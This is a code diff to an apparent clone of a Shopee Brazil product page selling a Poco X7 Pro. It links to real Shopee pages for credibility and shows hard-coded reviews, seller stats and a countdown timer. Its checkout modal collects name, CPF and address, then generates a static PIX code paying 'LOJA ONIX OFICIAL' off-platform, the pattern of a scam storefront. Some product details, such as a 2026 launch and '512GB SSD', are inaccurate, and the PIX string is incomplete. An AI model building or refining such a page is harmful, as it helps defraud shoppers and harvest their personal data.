@@ -40,7 +40,7 @@
         .price-row { color: var(--shopee); font-size: 26px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
         .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
 
-        /* LOJA (ESTILO ATUALIZADO) */
+        /* LOJA */
         .shop-section { background: white; padding: 15px; margin-bottom: 8px; }
         .shop-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; }
         .shop-info { display: flex; align-items: center; gap: 10px; }
@@ -50,9 +50,9 @@
         .stat-item:last-child { border-right: none; }
         .stat-val { display: block; color: var(--shopee); font-weight: bold; font-size: 13px; }
         .stat-label { font-size: 10px; color: #757575; }
-        .btn-visit-shop { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 10px; font-size: 12px; background: white; border-radius: 2px; text-decoration: none; }
+        .btn-visit-shop { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 10px; font-size: 12px; background: white; border-radius: 2px; text-decoration: none; font-weight: 500; }
 
-        /* ESPECIFICAÇÕES E DESCRIÇÃO */
+        /* ESPECIFICAÇÕES */
         .info-section { background: white; padding: 15px; margin-bottom: 8px; }
         .spec-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
         .spec-label { font-size: 14px; font-weight: 500; }
@@ -72,15 +72,14 @@
         .review-media { display: flex; gap: 6px; overflow-x: auto; margin-top: 10px; }
         .review-media video, .review-media img { width: 100px; height: 100px; object-fit: cover; border-radius: 2px; flex-shrink: 0; }
 
-        /* RODAPÉ */
+        /* RODAPÉ E MODAL */
         .footer-main { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
         .btn-orange-full { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; height: 100%; text-transform: uppercase; }
-
-        /* MODAL */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
         .modal-content { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 12px 12px 0 0; max-height: 92vh; overflow-y: auto; }
         .modal-nav { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; }
         .modal-nav i { color: var(--shopee); font-size: 20px; cursor: pointer; margin-right: 15px; }
+        .modal-nav span { font-weight: bold; font-size: 16px; color: #333; }
         .step-container { background: white; padding: 15px; margin-bottom: 8px; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; margin: 0 8px 8px 0; }
@@ -131,21 +130,12 @@
                     <p style="font-size:11px; color:#888;">Ativo há 3 minutos</p>
                 </div>
             </div>
-            <a href="#" class="btn-visit-shop">Ver página da Loja</a>
+            <a href="https://shopee.com.br/shop/1078992312" target="_blank" class="btn-visit-shop">Ver página da Loja</a>
         </div>
         <div class="shop-stats">
-            <div class="stat-item">
-                <span class="stat-val">250</span>
-                <span class="stat-label">Produtos</span>
-            </div>
-            <div class="stat-item">
-                <span class="stat-val">5.0</span>
-                <span class="stat-label">Avaliação</span>
-            </div>
-            <div class="stat-item">
-                <span class="stat-val">90%</span>
-                <span class="stat-label">Resposta Chat</span>
-            </div>
+            <div class="stat-item"><span class="stat-val">250</span><span class="stat-label">Produtos</span></div>
+            <div class="stat-item"><span class="stat-val">5.0</span><span class="stat-label">Avaliação</span></div>
+            <div class="stat-item"><span class="stat-val">90%</span><span class="stat-label">Resposta Chat</span></div>
         </div>
     </div>
 
@@ -154,23 +144,14 @@
             <span class="spec-label">Especificação</span>
             <span class="spec-value">Estoque, Marca <i class="fas fa-chevron-right" style="font-size: 10px; margin-left: 5px;"></i></span>
         </div>
-
         <p class="desc-title">Descrição</p>
         <div class="desc-content">
-            O Poco X7 Pro na versão de 12GB de RAM e 512GB de armazenamento é um smartphone focado em alto desempenho, equipado com o processador MediaTek Dimensity 8400-Ultra e uma bateria robusta de 6000mAh. Lançado globalmente em janeiro de 2025, o dispositivo destaca-se pela tela AMOLED de 1.5K e carregamento ultra rápido de 90W.
-            <br><br>
-            <b>Ficha Técnica Detalhada (12GB + 512GB)</b>
+            O Poco X7 Pro (12GB/512GB) é um monstro de desempenho com MediaTek Dimensity 8400-Ultra e bateria de 6000mAh. Lançamento Global 2026.
         </div>
-
         <table class="tech-table">
-            <tr><td class="tech-key">Processador</td><td class="tech-val">MediaTek Dimensity 8400-Ultra (4nm)</td></tr>
-            <tr><td class="tech-key">Memória RAM</td><td class="tech-val">12GB LPDDR5X</td></tr>
-            <tr><td class="tech-key">Armazenamento</td><td class="tech-val">512GB UFS 4.0</td></tr>
-            <tr><td class="tech-key">Tela</td><td class="tech-val">AMOLED 6.67" 1.5K, 120Hz, 3200 nits</td></tr>
-            <tr><td class="tech-key">Bateria</td><td class="tech-val">6000mAh + 90W HyperCharge</td></tr>
-            <tr><td class="tech-key">Câmera</td><td class="tech-val">50MP (Sony IMX882) c/ OIS + 8MP</td></tr>
-            <tr><td class="tech-key">Sistema</td><td class="tech-val">Xiaomi HyperOS 2 (Android 15)</td></tr>
-            <tr><td class="tech-key">Resistência</td><td class="tech-val">IP68 / IP69 (À prova d'água)</td></tr>
+            <tr><td class="tech-key">Processador</td><td class="tech-val">Dimensity 8400-Ultra</td></tr>
+            <tr><td class="tech-key">Memória</td><td class="tech-val">12GB RAM / 512GB SSD</td></tr>
+            <tr><td class="tech-key">Tela</td><td class="tech-val">AMOLED 1.5K 120Hz</td></tr>
         </table>
     </div>
 
@@ -179,22 +160,19 @@
             <p style="font-size:13px; font-weight:bold;">AVALIAÇÕES DO PRODUTO (19.566)</p>
             <div style="color:var(--shopee); font-size:11px; margin-top:3px;">⭐⭐⭐⭐⭐ 5/5</div>
         </div>
-        <span style="color:var(--shopee); font-size:12px;">Ver Tudo ></span>
+        <a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" target="_blank" style="text-decoration:none; color:var(--shopee); font-size:12px;">Ver Tudo ></a>
     </div>
 
     <div class="review-item">
-        <div style="font-size:12px; font-weight:500;">m***a <span style="color:#999; font-weight: normal;">• 2 dias atrás</span></div>
+        <div style="font-size:12px; font-weight:500;">m***a <span style="color:#999;">• 2 dias atrás</span></div>
         <div style="color:#ee4d2d; font-size:10px; margin:5px 0;">⭐⭐⭐⭐⭐</div>
-        <p style="font-size:13px;">Aparelho incrível! A cor amarela é linda, chegou lacrado. O processador roda tudo sem travar.</p>
-        <div class="review-media">
-            <video autoplay loop muted playsinline src="https://down-bs-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-mc6f0gc92ch3fd.16000051752497615.mp4"></video>
-            <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-mc6f0urdynjb78">
-            <img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-m8u7h53yv98o32">
-        </div>
+        <p style="font-size:13px;">Aparelho incrível! A cor amarela é linda, chegou lacrado.</p>
     </div>
 
     <div style="padding: 15px; background: white;">
-        <button style="width: 100%; padding: 10px; background: white; border: 1px solid #ddd; color: #555; font-size: 13px; border-radius: 2px;">Ver todas as avaliações</button>
+        <a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" target="_blank" style="text-decoration:none;">
+            <button style="width: 100%; padding: 10px; background: white; border: 1px solid #ddd; color: #555; font-size: 13px; border-radius: 2px;">Ver todas as avaliações</button>
+        </a>
     </div>
 
     <div class="footer-main">
@@ -221,13 +199,10 @@
                 <div id="cor-group" style="margin-bottom:15px;">
                     <button class="opt-btn" onclick="selectVar(this, 'cor')">AMARELO</button>
                     <button class="opt-btn" onclick="selectVar(this, 'cor')">PRETO</button>
-                    <button class="opt-btn" onclick="selectVar(this, 'cor')">CINZA</button>
-                    <button class="opt-btn" onclick="selectVar(this, 'cor')">IRON MAN</button>
                 </div>
                 <p style="font-size:14px; font-weight:bold; margin-bottom:10px;">Armazenamento (GB):</p>
                 <div id="gb-group" style="margin-bottom:15px;">
                     <button class="opt-btn" onclick="selectVar(this, 'gb')">512GB-12GB</button>
-                    <button class="opt-btn" onclick="selectVar(this, 'gb')">256GB-8GB</button>
                     <button class="opt-btn" onclick="selectVar(this, 'gb')">256GB-12GB</button>
                 </div>
                 <button class="btn-orange-full" style="margin-top:15px; border-radius:4px;" onclick="nextStep(2)">PRÓXIMO</button>
@@ -252,14 +227,7 @@
                     <p id="res-nome-final" style="font-weight:bold; margin-top:5px;"></p>
                     <p id="res-end-final" style="font-size:12px; color:#666;"></p>
                 </div>
-                <div style="padding:15px; background:#fff; margin-top:8px;">
-                    <p style="font-weight:bold; margin-bottom:10px;">Opções de Envio</p>
-                    <div class="shipping-option selected" onclick="selectEnvio(0, this)">
-                        <div><p style="font-size:13px; font-weight:bold;">Envio Econômico (Grátis)</p></div>
-                        <div class="shopee-radio selected"></div>
-                    </div>
-                </div>
-                <div style="padding:20px 15px; background:#fff; border-top:1px solid #eee; margin-top:8px;">
+                <div style="padding:20px 15px; background:#fff; margin-top:8px;">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                         <span style="font-size:16px; font-weight:bold;">Total do Pedido:</span>
                         <span id="total-txt" style="color:var(--shopee); font-size:22px; font-weight:bold;">R$599,00</span>
@@ -279,51 +247,82 @@
 
     <script>
         let currentStep = 1; 
-        let qty = 1;
         let precoBase = 599; 
         let corSel = ""; 
         let gbSel = "";
 
-        function openModal() { document.getElementById('modal').style.display = 'block'; }
+        const titulos = ["", "Selecionar Opção", "Dados de Entrega", "Confirmar Pedido", "Pagamento"];
+
+        function openModal() { 
+            document.getElementById('modal').style.display = 'block'; 
+            updateModalHeader();
+        }
+
+        function updateModalHeader() {
+            document.getElementById('modal-title').innerText = titulos[currentStep];
+        }
+
         function nextStep(n) {
-            if (n === 2 && (!corSel || !gbSel)) return alert("Selecione Cor e GB!");
+            if (n === 2 && (!corSel || !gbSel)) return alert("Selecione Cor e Armazenamento!");
             document.querySelectorAll('[id^="step-"]').forEach(s => s.style.display = 'none');
             document.getElementById('step-' + n).style.display = 'block';
             currentStep = n;
+            updateModalHeader();
         }
-        function prevStep() { if (currentStep === 1) document.getElementById('modal').style.display = 'none'; else nextStep(currentStep - 1); }
+
+        function prevStep() { 
+            if (currentStep === 1) {
+                document.getElementById('modal').style.display = 'none';
+            } else {
+                nextStep(currentStep - 1);
+            }
+        }
+
         function selectVar(btn, grupo) {
             document.querySelectorAll(`#${grupo}-group .opt-btn`).forEach(b => b.classList.remove('selected'));
             btn.classList.add('selected');
             if (grupo === 'cor') corSel = btn.innerText;
             if (grupo === 'gb') gbSel = btn.innerText;
         }
+
         async function buscarCEP() {
             let c = document.getElementById('cep').value;
             if (c.length === 8) {
-                const r = await fetch(`https://viacep.com.br/ws/${c}/json/`);
-                const d = await r.json();
-                if (!d.erro) {
-                    document.getElementById('rua').value = d.logradouro;
-                    document.getElementById('cidade').value = d.localidade + " / " + d.uf;
-                }
-            }
+                try {
+                    const r = await fetch(`https://viacep.com.br/ws/${c}/json/`);
+                    const d = await r.json();
+                    if (!d.erro) {
+                        document.getElementById('rua').value = d.logradouro;
+                        document.getElementById('cidade').value = d.localidade + " / " + d.uf;
+                    } else { alert("CEP não encontrado."); }
+                } catch(e) { alert("Erro ao buscar CEP."); }
+            } else { alert("Digite o CEP completo (8 números)."); }
         }
+
         function validarDados() {
-            if (!document.getElementById('nome').value || document.getElementById('cpf').value.length < 11) return alert("Preencha os dados!");
-            document.getElementById('res-nome-final').innerText = document.getElementById('nome').value.toUpperCase();
-            document.getElementById('res-end-final').innerText = `${document.getElementById('rua').value} - ${document.getElementById('cidade').value}`;
+            const nome = document.getElementById('nome').value;
+            const cpf = document.getElementById('cpf').value;
+            if (!nome || cpf.length < 11) return alert("Preencha Nome e CPF corretamente!");
+            document.getElementById('res-nome-final').innerText = nome.toUpperCase();
+            document.getElementById('res-end-final').innerText = `${document.getElementById('rua').value}, ${document.getElementById('cidade').value}`;
             nextStep(3);
         }
+
         function gerarPix() {
             const val = precoBase.toFixed(2);
+            // Payload PIX Estático (Exemplo)
             const px = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540" + val + "5802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304";
             document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(px)}&color=ee4d2d`;
             document.getElementById('pix-copy').innerText = px;
             nextStep(4);
         }
-        function copiarPix() { navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado!"); }
+
+        function copiarPix() { 
+            const texto = document.getElementById('pix-copy').innerText;
+            navigator.clipboard.writeText(texto).then(() => alert("Código PIX copiado!"));
+        }
         
+        // Timer Regressivo
         let t = 5400; 
         setInterval(() => {
             if (t > 0) t--;
